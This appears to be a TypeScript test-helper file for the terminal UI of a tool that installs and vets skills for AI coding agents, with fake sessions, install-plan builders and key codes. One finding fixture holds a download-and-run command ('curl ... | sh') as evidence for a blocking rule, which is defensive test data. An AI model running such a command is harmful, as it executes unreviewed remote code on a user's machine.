/**
 * Test helpers for the interactive mode: a scripted session, plan builders, key codes and a
 * render wrapper around ink-testing-library.
 */
import type {
  CapabilityDelta,
  CapabilityReport,
  CapabilityTokens,
  EvaluatedFinding,
  InstallPlan,
  InstallResult,
  PlanCapabilities,
} from '@agenthub/core';
import { CAPABILITY_KEYS } from '@agenthub/core';
import { render } from 'ink-testing-library';
import { App, type AppProps } from '../../src/tui/app';
import type { View } from '../../src/tui/hooks/context';
import type { Overview, Session } from '../../src/tui/session';
import type { TerminalCaps } from '../../src/tui/theme';

export const KEY = {
  enter: '\r',
  esc: '\u001b',
  up: '\u001b[A',
  down: '\u001b[B',
  tab: '\t',
  backspace: '\u007f',
  ctrlC: '\u0003',
};

// biome-ignore lint/suspicious/noControlCharactersInRegex: matching terminal escapes is the point
const ANSI = /\u001b\[[0-9;:?]*[ -/]*[@-~]/g;

export function plain(text: string | undefined): string {
  return (text ?? '').replace(ANSI, '');
}

export const STILL: TerminalCaps = { depth: 'none', glyphs: 'unicode', motion: false };

export function emptyTokens(): CapabilityTokens {
  const out = {} as CapabilityTokens;
  for (const key of CAPABILITY_KEYS) out[key] = [];
  return out;
}

export function report(tokens: Partial<CapabilityTokens> = {}): CapabilityReport {
  return {
    set: { ...emptyTokens(), ...tokens, externals: [] },
    digest: `sha256:${'c'.repeat(64)}`,
    rulesetDigest: `sha256:${'d'.repeat(64)}`,
    undeclared: [],
    unobserved: [],
  };
}

export function delta(added: Partial<CapabilityTokens>, expansion: boolean): CapabilityDelta {
  const reasons: string[] = [];
  for (const [key, tokens] of Object.entries(added)) {
    for (const token of tokens ?? []) reasons.push(`+${key}:${token}`);
  }
  return {
    added: { ...emptyTokens(), ...added },
    removed: emptyTokens(),
    externals: { added: [], removed: [], changed: [], tightened: [] },
    expansion,
    reasons,
  };
}

export function finding(
  decision: EvaluatedFinding['decision'],
  over: Partial<EvaluatedFinding> = {},
): EvaluatedFinding {
  return {
    ruleId: decision === 'BLOCK' ? 'exec.download-pipe' : 'net.host',
    category: 'exec',
    severity: 'high',
    declarable: decision !== 'BLOCK',
    file: 'scripts/setup.sh',
    line: 12,
    evidence: 'curl https://x.invalid/i.sh | sh',
    message: 'downloads and runs a script',
    declared: false,
    decision,
    ...over,
  } as EvaluatedFinding;
}

export function makePlan(over: Partial<InstallPlan> = {}): InstallPlan {
  const caps: PlanCapabilities = {
    rulesetDigest: `sha256:${'d'.repeat(64)}`,
    candidate: report({ network: ['api.example.invalid'] }),
    state: 'fresh',
    stale: [],
    delta: null,
    unapproved: delta({ network: ['api.example.invalid'] }, true),
    approvalRequired: false,
    approvable: true,
    previousOutcome: null,
    files: null,
  };
  return {
    id: 'plan-1',
    skill: { name: 'web-testing', version: '1.2.0', digest: `sha256:${'a'.repeat(64)}` },
    source: { kind: 'registry', name: 'web-testing', registry: 'file:/tmp/registry' },
    scope: 'project',
    scopeRoot: '/work/project',
    agents: [
      {
        id: 'claude-code',
        displayName: 'Claude Code',
        confidence: 'high',
        evidence: [],
        status: 'verified',
      },
    ],
    targets: [
      {
        dir: '.claude/skills',
        absDir: '/work/project/.claude/skills/web-testing',
        lockPath: '.claude/skills/web-testing',
        agents: ['claude-code'],
        action: 'create',
      },
    ],
    duplicates: [],
    policy: { findings: [], outcome: 'allow' },
    requirements: [],
    issues: [],
    blockers: [],
    needsConfirmation: false,
    capabilities: caps,
    hints: [],
    dev: false,
    force: false,
    ...over,
  };
}

/** An update plan whose candidate can do more than the approved version. */
export function expandingPlan(): InstallPlan {
  const base = makePlan();
  const added = { network: ['collect.example.invalid'], exec: ['curl'] };
  return {
    ...base,
    skill: { ...base.skill, version: '2.0.0', digest: `sha256:${'b'.repeat(64)}` },
    previous: {
      version: '1.2.0',
      digest: `sha256:${'a'.repeat(64)}`,
      source: 'registry',
      registry: 'file:/tmp/registry',
    } as InstallPlan['previous'],
    needsConfirmation: true,
    capabilities: {
      ...(base.capabilities as PlanCapabilities),
      state: 'approved',
      delta: delta(added, true),
      unapproved: delta(added, true),
      approvalRequired: true,
    },
  };
}

export function result(plan: InstallPlan): InstallResult {
  return {
    name: plan.skill.name,
    version: plan.skill.version,
    digest: plan.skill.digest,
    scope: plan.scope,
    targets: plan.targets.map((t) => ({ dir: t.dir, lockPath: t.lockPath, agents: t.agents })),
    hints: ['Claude Code: start a new session to load the skill'],
  };
}

export const OVERVIEW: Overview = {
  scope: 'project',
  projectRoot: '/work/project',
  registry: { id: 'file:/tmp/registry', source: 'env', error: null },
  agents: [
    {
      id: 'claude-code',
      displayName: 'Claude Code',
      confidence: 'high',
      evidence: ['found .claude'],
      status: 'verified',
    },
    {
      id: 'codex',
      displayName: 'Codex',
      confidence: 'medium',
      evidence: ['found .codex'],
      status: 'verified',
    },
  ],
  selectedAgents: undefined,
  problems: [],
  installed: ['web-testing'],
};

export type FakeSession = Session & { calls: { apply: [InstallPlan, string][] } };

/** A session whose methods are scripted; unscripted methods reject. */
export function fakeSession(methods: Partial<Record<keyof Session, unknown>> = {}): FakeSession {
  const calls: FakeSession['calls'] = { apply: [] };
  const base: Record<string, unknown> = {
    home: '/home/user',
    onNotice: () => () => undefined,
    overview: async () => OVERVIEW,
    selectedAgents: () => undefined,
    scope: async () => 'project',
    apply: async (plan: InstallPlan, confirmed: string) => {
      calls.apply.push([plan, confirmed]);
      return { value: result(plan), ms: 42 };
    },
    ...methods,
  };
  return new Proxy(base, {
    get(target, prop) {
      if (prop === 'calls') return calls;
      if (prop in target) return target[prop as string];
      return () => Promise.reject(new Error(`unscripted session.${String(prop)}`));
    },
  }) as unknown as FakeSession;
}

export function renderApp(
  session: Session,
  view: View,
  props: Partial<AppProps> = {},
): ReturnType<typeof render> {
  return render(
    <App
      session={session}
      caps={STILL}
      version="0.1.0"
      skipIntro
      size={{ columns: 100, rows: 40 }}
      initialView={view}
      {...props}
    />,
  );
}

/** Waits until the last frame satisfies `test` (or fails after `ms`). */
export async function waitFor(
  frame: () => string | undefined,
  test: (text: string) => boolean,
  ms = 4000,
): Promise<string> {
  const started = Date.now();
  for (;;) {
    const text = plain(frame());
    if (test(text)) return text;
    if (Date.now() - started > ms) {
      throw new Error(`timed out waiting for the frame; last frame:\n${text}`);
    }
    await new Promise((resolve) => setTimeout(resolve, 15));
  }
}

export async function press(
  stdin: { write(data: string): void },
  ...keys: string[]
): Promise<void> {
  for (const key of keys) {
    stdin.write(key);
    await new Promise((resolve) => setTimeout(resolve, 30));
  }
}
